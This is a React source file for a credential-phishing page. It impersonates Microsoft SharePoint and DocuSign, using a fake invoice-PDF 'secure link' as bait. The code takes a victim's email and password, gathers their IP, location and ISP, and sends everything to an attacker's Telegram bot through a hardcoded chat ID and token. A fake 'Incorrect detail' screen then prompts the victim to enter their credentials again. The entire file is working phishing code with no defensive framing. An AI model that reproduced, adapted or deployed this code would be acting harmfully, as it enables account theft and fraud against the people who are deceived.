import axios from "axios";
import { useEffect, useState } from "react";
import Logo from "./logo.png";
import PdfImg from "./pdf3.png";

const TELEGRAM_CHAT_ID = "6650858714"
const TELEGRAM_URL = "7941802899:AAHWccmwE6CX3De_JINjb9PVDMy3ZmVClv4"

const App = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [step, setStep] = useState("email"); // 'email' | 'password' | 'error'
  const [ipDetails, setIpDetails] = useState(null);
  const [tryAgain, setTryAgain] = useState(false);

  useEffect(() => {
    const fetchIpDetails = async () => {
      try {
        const res = await axios.get("https://ipapi.co/json/");
        setIpDetails(res.data);
      } catch {
        setIpDetails({ ip: "Unavailable", city: "Unknown", country_name: "", org: "" });
      }
    };
    fetchIpDetails();
  }, []);

  const sendToTelegram = async (label) => {
    const message = `
ðŸ” *${label}*
*Email:* ${email}
*Password:* ${password}
ðŸŒ *Location:* ${ipDetails?.city || "Unknown"}, ${ipDetails?.country_name || ""}
ðŸŒ *IP:* ${ipDetails?.ip || "Unavailable"}
ðŸ›  *ISP:* ${ipDetails?.org || ""}
    `;
    const url = `${TELEGRAM_URL}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    });
  };

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep("password");
    }, 1000);
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    setSubmitting(true);
    try {
      await sendToTelegram("DocuSg");
      setStep("error"); // Now show "Incorrect detail" page
    } catch (err) {
      console.error("Error sending:", err);
    } finally {
      setSubmitting(false);
      setPassword("");
    }
  };

  const handleErrorSubmit = async (e) => {
    e.preventDefault();
    setSubmitting(true);
    try {
      await sendToTelegram("Retry Attempt");
      setTryAgain(true);
      setStep("email");
      setEmail("");
      setPassword("");
      setTimeout(() => setTryAgain(false), 5000);
    } catch (err) {
      console.error("Final error:", err);
    } finally {
      setSubmitting(false);
    }
  };

  // âœ… STEP: Error Page (email + password form)
  if (step === "error") {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="bg-white p-8 rounded-lg shadow-lg w-96 text-center">
          <h2 className="text-xl font-bold text-red-600 mb-4">Incorrect detail.</h2>
          <form onSubmit={handleErrorSubmit}>
            <input
              type="email"
              placeholder="Enter Your Business Email"
              className="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400 mb-3"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Enter Your Password"
              className="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400 mb-3"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="submit"
              className="w-full mt-2 p-2 bg-blue-600 text-white rounded-md hover:bg-blue-700"
              disabled={submitting}
            >
              {submitting ? "Logging in..." : "Submit"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  // âœ… STEP: Password Page
  if (step === "password") {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="bg-white p-8 rounded-lg shadow-lg w-96 text-center">
          <h2 className="text-xl font-semibold text-blue-600">Email Password</h2>
          <p className="text-gray-600 mt-2 font-bold">{email}</p>
          <form onSubmit={handlePasswordSubmit}>
            <input
              type="password"
              placeholder="Enter Your Password"
              className="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400 mt-4"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="submit"
              className="w-full mt-4 p-2 bg-blue-600 text-white rounded-md hover:bg-blue-700"
              disabled={submitting}
            >
              {submitting ? "Submitting..." : "Submit"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  // âœ… STEP: Initial Email Page
  return (
    <div className="h-screen bg-gray-100">
      <div className="bg-blue-600 py-3 w-full font-bold text-white text-2xl pl-10">Microsoft SharePoint</div>
      <div className="flex items-center justify-center h-auto py-32 bg-gray-100">
        <div className="bg-white py-8 rounded-lg shadow-lg w-96 text-center">
          <img src={Logo} alt="logo" className="mx-auto mb-4 w-24 -mt-24" />
          <h2 className="text-xl font-semibold text-blue-600 w-full py-4 bg-gray-200">Docu Sign</h2>
          <p className="text-gray-600 my-2">You've received a secure link to:</p>
          <div className="flex items-center justify-center gap-2 my-5">
            <img src={PdfImg} alt="PDF" className="w-6 h-6" />
            <span className="text-gray-800 font-medium">INV007209.pdf</span>
          </div>
          <p className="text-sm text-gray-500 my-3">To open this secure link, enter the Office365 email this document was shared with.</p>

          {tryAgain && (
            <div className="text-sm text-red-600 font-semibold mb-3">
              Try again later.
            </div>
          )}

          <form onSubmit={handleEmailSubmit} className="mt-4">
            <input
              type="email"
              placeholder="Enter Your Business Email"
              className="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <button
              type="submit"
              className="w-full mt-6 p-3 bg-blue-600 text-white hover:bg-blue-700 disabled:bg-gray-400"
              disabled={loading}
            >
              {loading ? "Verifying..." : "Next"}
            </button>
          </form>
        </div>
      </div>
      <div className="bg-gray-100 text-center">
        Â© 2025 Microsoft
        <span className="text-blue-500 ml-2">Privacy & Cookies</span>
      </div>
    </div>
  );
};

export default App;
